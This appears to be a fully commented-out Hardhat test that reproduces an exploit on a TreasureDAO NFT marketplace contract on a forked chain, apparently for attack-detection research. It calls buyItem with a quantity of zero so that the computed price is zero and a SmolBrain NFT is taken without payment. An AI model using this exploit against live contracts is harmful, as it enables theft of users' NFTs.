// import { ethers } from 'hardhat'
// import { TreasureDao, IERC721, Address } from '../typechain-types'
// import { expect } from 'chai'

// describe('CCA Detects Sandbox Attack Test', async function () {
//     let itreasure: any
//     let victim: string
//     let iSmolBrain: any

//     // beforeEach(async () => {
//     //     victim = await ethers.getAddress('0x9cfA73B8d300Ec5Bf204e4de4A58e5ee6B7dC93C')
//     //     itreasure = await ethers.getContractAt('TreasureDao', '0x812cdA2181ed7c45a35a691E0C85E231D218E273')
//     //     iSmolBrain = await ethers.getContractAt('IERC721', '0x6325439389E0797Ab35752B4F43a14C004f22A9c')
//     // })

//     it('should block number equal to 32971742', async function () {
//         const blockNumber = await ethers.provider.getBlockNumber()
//         expect(blockNumber).to.equal(32971742)
//     })

//     // it('should execute the attack', async function () {
//     //     let tokenId = 3557
//     //     let nftOwner = await iSmolBrain.ownerOf(tokenId)
//     //     console.log('Original NFT owner of SmolBrain:', nftOwner)
//     //     await itreasure.buyItem(
//     //         '0x6325439389e0797ab35752b4f43a14c004f22a9c',
//     //         tokenId,
//     //         nftOwner,
//     //         0,
//     //         6969000000000000000000n,
//     //     )
//     //     // The formula for calculating the price an NFT is totalPrice = _pricePerItem * _quantity, so the price of buying an NFT is calculated as 0,
//     //     console.log('Exploit completed, NFT owner of SmolBrain:', await iSmolBrain.ownerOf(tokenId))
//     // })
// })
